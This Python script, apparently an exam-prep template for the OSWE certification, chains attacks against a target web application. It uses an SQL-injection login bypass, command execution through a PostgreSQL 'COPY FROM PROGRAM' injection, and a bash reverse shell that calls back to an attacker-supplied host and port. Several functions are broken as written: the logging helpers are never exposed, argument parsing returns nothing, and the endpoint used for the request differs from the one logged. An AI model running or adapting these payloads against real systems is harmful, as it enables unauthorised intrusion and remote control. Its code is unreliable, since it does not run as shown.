#!/usr/bin/env python3

import sys
import requests
import argparse
import sys
import urllib.parse
from datetime import datetime

# ─── Colors ────────────────────────────────────────────────────────
GREEN = '\033[0;32m'
RED = '\033[0;31m'
GREY = '\033[38;5;244m'
NC = '\033[0m'

"""
OSWE Exploit Skeleton
Steps: 1) Auth Bypass  2) RCE  3) Reverse Shell
"""
# ─── Argument Parsing ────────────────────────────────────────────────────────
def parse_args():
    global args
    parser = argparse.ArgumentParser(description="OSWE Exploit Skeleton")
    parser.add_argument("-t", "--target",   required=True,  help="Target base URL (e.g. http://192.168.1.10)")
    parser.add_argument("-l", "--lhost",    required=True,  help="Attacker IP for reverse shell")
    parser.add_argument("-p", "--lport",    required=True,  type=int,   help="Attacker port for reverse shell")
    parser.add_argument("--proxy",          default=False,  type=bool,  help="Enable Burp default proxies (8080)")
    parser.add_argument("--no-verify",      action="store_true", default=True,  help="Disable SSL verification")
    parser.add_argument("-d", "--debug",    action="store_true", default=False, help="Debug mode")

    args = parser.parse_args()
    return 

# ─── Session Setup ────────────────────────────────────────────────────────────
def build_session():
    s = requests.Session()
    s.verify = not args.no_verify
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    if args.proxy:
        s.proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
    return s

# ─── Logging Setup ────────────────────────────────────────────────────────────
def log():
    def _ts():
        return datetime.now().strftime("%H:%M:%S")

    def success(text):
        print(f"[{log._ts()}] [{GREEN}✓{NC}] {GREEN}{text}{NC}")

    def failure(text):
        print(f"[{log._ts()}] [{RED}✘{NC}] {RED}{text}{NC}")
        if args.debug:
            log.dbg("Exiting ...")
        sys.exit()

    def info(text):
        print(f"[{log._ts()}] [{GREY}*{NC}] {GREY}{text}{NC}")

    def debug(text):
        if args.debug:
            print(f"[{log._ts()}] [{GREY}DEBUG{NC}] {GREY}{text}{NC}")

# ─── Step 1: Auth Bypass ──────────────────────────────────────────────────────
def auth_bypass(session, target):
    log.info("Step 1: Attempting auth bypass...")

    url = f"{target}/login" # Example vulnerable endpoint

    data = { # Example data
        "username": "admin'-- -",
        "password": "anything",
    }

    r = session.post(url, data=data, allow_redirects=False)

    log.info(f"POST {url} → {r.status_code}")
    log.debug(f"\tResponse: {r.text[:200]}")

    if r.status_code in (200, 301, 302) or "home" in r.text.lower(): # The string 'home' is a placeholder, change it
        log.success("Auth Bypass complete!")
        cookies = r.cookies.get_dict()
        log.debug(f"Cookies: {cookies}")
        return cookies

    log.failure("Auth Bypass failed")

# ─── Step 2: Remote Code Execution ───────────────────────────────────────────
def rce(session, cookies, target, cmd):
    log.info(f"Step 2: Attempting RCE with cmd: {cmd}")

    url = f"{target}/uploads/shell.php" # Example vulnerable endpoint

    payload = f"0; COPY cmd_out FROM PROGRAM '{cmd}'" # Example SQL Payload
    r = session.get(f"{target}/vuln", params={"id": payload}, cookies=cookies)
    out = r.text

    log.info(f"GET {url} → {r.status_code}")
    log.debug(f"\tResponse: {r.text[:200]}")

    if r.status_code is 200 or out:
        log.success("RCE complete!")
        log.debug(f"\tOutput: {out}")
        return out

    log.failure("RCE failed")
    sys.exit(1)

# ─── Step 3: Reverse Shell ────────────────────────────────────────────────────
def reverse_shell(session, cookies, target, lhost, lport):
    log.info(f"Step 3: Attempting reverse shell to {lhost}:{lport}")

    shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" # Example payload
    log.debug(f"Shell payload (raw): {shell}")

    # Encode to avoid bad characters
    encoded = urllib.parse.quote(shell)
    log.debug(f"Shell payload (encoded): {encoded}")

    # Reuse the RCE vector — pass the shell command through it
    status = rce(session, cookies, target, shell)
    if status:
        log.success("Reverse shell sent, watch your listener.")
    
    # TODO: Create reverse shell listener as a function
    log.failure("Reverse Shell failed")
    sys.exit(1)

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    args    = parse_args()
    session = build_session()
    target  = args.target.rstrip("/")

    log().info(f"Target : {target}")
    log().info(f"LHOST : {args.lhost}:{args.lport}")
    log().info(f"Proxy  : {args.proxy or 'None'}")

    # Step 1 — Auth bypass (populates session cookies)
    cookies = auth_bypass(session, target)

    # Step 2 — Verify RCE with a safe command (id/whoami)
    rce(session, cookies, target, "whoami")

    # Step 3 — Pop shell
    reverse_shell(session, cookies, target, args.lhost, args.lport)

if __name__ == "__main__":
    main()